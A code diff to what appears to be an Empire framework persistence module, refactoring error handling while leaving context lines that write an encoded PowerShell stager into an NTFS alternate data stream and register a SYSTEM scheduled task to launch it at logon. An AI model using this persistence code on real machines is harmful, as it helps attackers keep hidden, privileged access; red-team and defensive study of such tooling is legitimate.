@@ -1,15 +1,14 @@
 from __future__ import print_function
 
 import os
-
-from builtins import str
 from builtins import object
-
-from empire.server.utils import data_util
-from empire.server.common import helpers
+from builtins import str
 from typing import Dict
 
+from empire.server.common import helpers
 from empire.server.common.module_models import PydanticModule
+from empire.server.utils import data_util
+from empire.server.utils.module_util import handle_error_message
 
 
 class Module(object):
@@ -52,8 +51,7 @@ class Module(object):
             if ads_path != '':
                 # remove the ADS storage location
                 if ".txt" not in ads_path:
-                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
-                    return ""
+                    return handle_error_message("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
 
                 script = "Invoke-Command -ScriptBlock {cmd /C \"echo x > "+ads_path+"\"};"
             else:
@@ -87,15 +85,13 @@ class Module(object):
                 status_msg += "using external file " + ext_file
 
             else:
-                print(helpers.color("[!] File does not exist: " + ext_file))
-                return ""
+                return handle_error_message("[!] File does not exist: " + ext_file)
 
         else:
             # if an external file isn't specified, use a listener
             if not main_menu.listeners.is_listener_valid(listener_name):
                 # not a valid listener, return nothing for the script
-                print(helpers.color("[!] Invalid listener: " + listener_name))
-                return ""
+                return handle_error_message("[!] Invalid listener: " + listener_name)
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
@@ -111,9 +107,8 @@ class Module(object):
         if ads_path != '':
             # store the script in the specified alternate data stream location
             if ".txt" not in ads_path:
-                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
-                    return ""
-            
+                return handle_error_message("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+
             script = "Invoke-Command -ScriptBlock {cmd /C \"echo "+enc_script+" > "+ads_path+"\"};"
 
             locationString = "$(cmd /c \''\''more < "+ads_path+"\''\''\'')"
@@ -138,8 +133,7 @@ class Module(object):
         
         # sanity check to make sure we haven't exceeded the cmd.exe command length max
         if len(trigger_cmd) > 259:
-            print(helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters."))
-            return ""
+            return handle_error_message("[!] Warning: trigger command exceeds the maximum of 259 characters.")
 
         if on_logon != '':
             script += "schtasks /Create /F /RU system /SC ONLOGON /TN "+task_name+" /TR "+trigger_cmd+";"
